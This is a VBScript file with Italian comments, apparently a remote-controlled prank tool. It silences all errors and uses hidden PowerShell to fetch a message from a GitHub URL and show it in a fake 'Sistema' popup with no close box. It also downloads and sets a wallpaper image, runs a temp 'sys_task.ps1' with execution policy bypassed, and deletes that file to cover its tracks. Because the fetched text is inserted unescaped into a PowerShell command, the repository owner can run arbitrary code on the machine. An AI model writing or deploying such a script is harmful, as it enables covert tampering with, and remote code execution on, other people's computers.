Option Explicit

Dim shell, fso, urlImmagine, urlMessaggio, percorsoLocale, percorsoScript, scriptPS, comandoPopup
Dim messaggioDalWeb, exec, comandoScaricaTesto, file

On Error Resume Next ' Silenzio assoluto su ogni errore

urlImmagine = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine.jpg"
urlMessaggio = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/messaggio.txt"

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- 1. RECUPERA IL MESSAGGIO ---
comandoScaricaTesto = "powershell -WindowStyle Hidden -NoProfile -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadString('" & urlMessaggio & "')"""
Set exec = shell.Exec(comandoScaricaTesto)
messaggioDalWeb = Trim(exec.StdOut.ReadAll)

' --- 2. MOSTRA IL POPUP (Solo se il messaggio esiste) ---
If messaggioDalWeb <> "" Then
    comandoPopup = "powershell -WindowStyle Hidden -NoProfile -Command ""Add-Type -AssemblyName System.Windows.Forms; " & _
        "$form = New-Object System.Windows.Forms.Form; $form.Text = 'Sistema'; $form.Size = New-Object System.Drawing.Size(400,180); " & _
        "$form.StartPosition = 'CenterScreen'; $form.FormBorderStyle = 'FixedDialog'; $form.ControlBox = $false; $form.TopMost = $true; " & _
        "$label = New-Object System.Windows.Forms.Label; $label.Text = '" & messaggioDalWeb & "'; $label.TextAlign = 'MiddleCenter'; $label.Dock = 'Fill'; " & _
        "$form.Controls.Add($label); $panel = New-Object System.Windows.Forms.Panel; $panel.Dock = 'Bottom'; $panel.Height = 50; " & _
        "$btn = New-Object System.Windows.Forms.Button; $btn.Text = 'OK'; $btn.Left = 160; $btn.Top = 10; $btn.Add_Click({$form.Close()}); " & _
        "$panel.Controls.Add($btn); $form.Controls.Add($panel); $form.ShowDialog() | Out-Null"""
    shell.Run comandoPopup, 0, True
End If

' --- 3. CAMBIO SFONDO ---
percorsoLocale = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Pictures\bg_data.jpg"
percorsoScript = shell.ExpandEnvironmentStrings("%TEMP%") & "\sys_task.ps1"

scriptPS = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
    "try { (New-Object System.Net.WebClient).DownloadFile('" & urlImmagine & "', '" & percorsoLocale & "'); " & _
    "if (Test-Path '" & percorsoLocale & "') { " & _
    "$path = (Get-Item '" & percorsoLocale & "').FullName; " & _
    "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $path; " & _
    "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value '10'; " & _
    "$code = @' " & vbCrLf & _
    "using System; using System.Runtime.InteropServices; " & vbCrLf & _
    "public class Wallpaper { [DllImport(""user32.dll"")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); } " & vbCrLf & _
    "'@; Add-Type -TypeDefinition $code; [Wallpaper]::SystemParametersInfo(0x0014, 0, $path, 0x0003); } } catch {}"

Set file = fso.CreateTextFile(percorsoScript, True)
file.Write scriptPS
file.Close

shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & percorsoScript & """", 0, True

' --- 4. PULIZIA FINALE ---
WScript.Sleep 3000
If fso.FileExists(percorsoScript) Then fso.DeleteFile percorsoScript

Set fso = Nothing: Set shell = Nothing
